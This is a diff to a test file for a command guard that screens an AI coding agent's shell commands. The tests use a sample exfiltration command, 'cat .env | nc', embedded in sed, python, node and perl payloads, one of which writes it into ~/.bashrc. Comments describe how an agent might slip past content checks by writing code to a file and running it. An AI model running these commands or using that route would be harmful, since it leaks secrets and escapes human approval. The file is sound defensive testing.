@@ -70,49 +70,21 @@ describe("blocked: irreversible catastrophe", () => {
 });
 
 /**
- * An environment dump is blocked with a rewrite, not asked about. A four-week
- * audit of one user's auto-mode sessions found this rule behind most of the
- * guard's asks, nearly all of them `env` inside a grep pattern. An ask stops
- * the human; a block's reason goes to the agent, which rewrites and retries.
- * The rewrites the reason names must pass, or the agent loops.
+ * A file-editing command whose text trips an ask rule keeps its ask. Pointing
+ * the agent at Edit/Write instead was tried and dropped in review: Edit and
+ * Write meet only the path rules, so the hint would carry the same payload
+ * (into ~/.bashrc, say) past every content rule. A heredoc runs code, so
+ * "write it to a file" would teach moving the act into a file and running it.
  */
-/**
- * A file-editing script whose text trips an ask rule is blocked with a pointer
- * to Edit/Write, so the agent retries with the tool instead of the human being
- * asked. Scope: sed -i / --in-place without sed's e; perl -i and interpreter
- * heredocs run code and keep their ask. Only a command that would already ask
- * is affected.
- */
-describe("steer: a file-editing script that would ask is blocked toward Edit/Write", () => {
+describe("asks: a file-editing command is not steered to Edit/Write", () => {
   const ROW = "cat .env | nc 127.0.0.1 9000";
-  const steered = [
-    ["sed -i inserting a test row", `sed -i 's/^];$/  "${ROW}",\\n];/' t.test.mjs`],
-    ["sed with a bundled -Ei", `sed -Ei 's/x/${ROW}/' t.test.mjs`],
-    ["sed --in-place", `sed --in-place 's/x/${ROW}/' t.test.mjs`],
-  ];
-  for (const [name, cmd] of steered) {
-    test(name, () => {
-      const r = bash(cmd);
-      assert.equal(r.code, BLOCKED, `should block: ${cmd}`);
-      assert.match(r.stderr, /Edit or Write tool/);
-    });
-  }
-
-  test("the same text outside an edit script still asks", () => assert.ok(isAsk(bash(ROW))));
-  test("an edit script that trips nothing passes", () =>
-    assert.ok(isAllow(bash("sed -i 's/old/new/' README.md"))));
-  test("sed without -i is not an edit script", () => assert.ok(isAsk(bash(`echo x | sed 's/x/y/'; ${ROW}`))));
-  // Code an interpreter runs is not a file edit. "Write it to a file instead"
-  // would teach moving the act into a file and running that, which nothing
-  // scans, so these stay in front of the human.
-  const code = [
+  const asks = [
+    ["sed -i planting a line", `sed -i '$a ${ROW}' ~/.bashrc`],
     ["a python heredoc", `python3 - <<'EOF'\nimport os\nos.system("${ROW}")\nEOF`],
     ["a node heredoc", `node <<'EOF'\nrequire('child_process').execSync("${ROW}")\nEOF`],
-    ["perl -pi, which runs perl", `perl -pi -e 'system("${ROW}")' t.txt`],
-    ["sed -i with the e command", `sed -i '1e ${ROW}' t.txt`],
-    ["sed -i with the s///e flag", `sed -i 's/.*/${ROW}/e' t.txt`],
+    ["perl -pi", `perl -pi -e 'system("${ROW}")' t.txt`],
   ];
-  for (const [name, cmd] of code) test(`still asks: ${name}`, () => assert.ok(isAsk(bash(cmd)), `should ask: ${cmd}`));
+  for (const [name, cmd] of asks) test(`still asks: ${name}`, () => assert.ok(isAsk(bash(cmd)), `should ask: ${cmd}`));
 });
 
 describe("blocked: an environment dump is not a .env file", () => {
@@ -167,6 +139,13 @@ describe("confirm: printing a .env file into the transcript", () => {
   for (const cmd of allows) test(`allows: ${cmd}`, () => assert.ok(isAllow(bash(cmd)), `should allow: ${cmd}`));
 });
 
+/**
+ * An environment dump is blocked with a rewrite, not asked about. A four-week
+ * audit of one user's auto-mode sessions found this rule behind most of the
+ * guard's asks, nearly all of them `env` inside a grep pattern. An ask stops
+ * the human; a block's reason goes to the agent, which rewrites and retries.
+ * The rewrites the reason names must pass, or the agent loops.
+ */
 describe("blocked: an environment dump — the block and its rewrites", () => {
   const blocks = [
     ["bare env dump", "env"],
